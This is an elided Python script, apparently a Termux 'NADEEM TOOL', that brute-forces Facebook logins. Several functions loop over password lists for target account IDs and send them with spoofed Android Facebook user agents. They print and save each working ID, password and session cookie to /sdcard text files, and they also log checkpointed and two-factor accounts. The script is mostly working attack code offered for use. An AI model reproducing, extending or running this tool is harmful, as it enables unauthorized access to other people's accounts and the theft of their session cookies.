...
print('\n \033[1;32m[√]\r\r\033[1;33m WELCOME  TO NADEEM TOOL\033[1;37m...!')
...
os.system('xdg-open https://chat.whatsapp.com/Fu33EqMoYJ5IGyV1YnjkI7')
print('\n \033[1;32m[√]\r\r\033[1;33m WELCOME  TO NADEEM TOOL...!')
...
def S1():
	...
	e = ";Dalvik/2.1.0 (Linux; U; Android{random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=3.0,width=1080,height=1800};FBLC/en_US;FBRV/334698665;FBCR/3 Macau;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI-M391;FBSV/4.0.4;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
	ua = s + e	
	return ua
...
|__/  \__/ \_______/ \_______/ \_______/ \_______/|__/ |__/ |__/
    ................................                                                                                                    
\033[1;33m═══════════════════════════════════════
\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m  AUTHOR    : NADEEM KHAN \033[92;1m•
\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m  FACEBOOK  : NADEEM_XD
\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m  GITHUB    : NOT FOUND
\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m  VERSION   : \033[92;1mTEST\033[92;1m.\033[92;1mING
\033[1;33m════════════════════════════════════════\033[1;33m""")   
def line():
	print(f'\033[1;37m-----------------------------------------------')
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mNADEEM\x1b[1;92m-\x1b[1;92mM3\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aws:
                                ...
                                print('\033[96;1 [NADEEM-OK] %s | %s'%(ids,pas))
                                open('/sdcard/NADEEM-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/NADEEM-OK-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                              
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [NADEEM-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/NADEEM-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api1(ids,names,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mNADEEM\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [NADEEM-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;37m [🍪] Cookies :- '+cookies)
				line()
				open('/sdcard/NADEEM-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;33m [NADEEM-CP] '+uid+' | '+pas+'\033[1;97m')
...
def rd(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mNADEEM\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()		
		for pas in passlist:                                          
			...
			if 'session_key' in po:
				...
				open('/sdcard/NADEEM-R-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')                                                          
				oks.append(uid)
				...
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;33m [NADEEM-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/NADEEM-R-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def bd1(ids,passlist):
    ...
    'user-agent': S1(),}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m [NADEEM-OK] '+ids+' | '+ps)                
                print('\033[1;37m [🍪] Cookies :- '+coki)                
                open('/sdcard/NADEEM-BD-OK.txt', 'a').write( ids+' | '+ps+' | '+coki+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(f'\r\r\033[1;33m [NADEEM-CP] '+ids+' | '+ps+'\033[1;97m')
                open('/sdcard/NADEEM-BD-CP.txt', 'a').write( ids+' | '+ps+' \n')
                cps.append(cid)
            elif twf in session.cookies.get_dict().keys():
                print('\033[1;93m\033[0;34mNADEEM-2F '+ids+' • '+ps+'  \033[0;97m')
                break
            else:
                continue
        loop+=1
...
def newidx(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mNADEEM\x1b[1;92m-\x1b[1;92mM2\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
